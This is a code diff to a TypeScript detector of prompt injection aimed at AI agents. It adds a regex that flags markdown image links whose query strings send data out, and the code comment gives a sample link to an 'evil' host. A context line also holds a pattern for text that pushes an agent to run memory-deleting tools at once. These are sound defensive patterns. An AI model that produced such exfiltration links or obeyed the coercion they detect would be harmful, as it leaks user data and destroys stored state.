@@ -144,6 +144,13 @@ const INJECTION_PATTERNS: Array<[string, RegExp]> = [
     "tool-call coercion",
     /\b(?:call|invoke|run|execute|use)\s+(?:the\s+)?[`'"]?(?:state_delete|state_write|memory_consolidate|memory_quarantine|memory_rebuild_edges)[`'"]?(?:\s+tool)?\s+(?:on\s+(?:every|all)|for\s+(?:every|all)|immediately|now\b|right\s+away)/i,
   ],
+  [
+    // A markdown image loads by itself when rendered, so a query string on a
+    // remote image is a classic exfiltration channel (![x](https://evil/p?d=...)).
+    // README badge hosts are exempt; plain links (no "!") need a click and pass.
+    "markdown exfiltration",
+    /!\[[^\]\n]{0,200}\]\(\s*<?https?:\/\/(?!(?:img\.shields\.io|badgen\.net|badge\.fury\.io|codecov\.io)[/:])[^\s)?#]{1,300}\?[^\s)]{0,2000}=/i,
+  ],
 ];
 
 /** First injection label found in `text`, or null. */
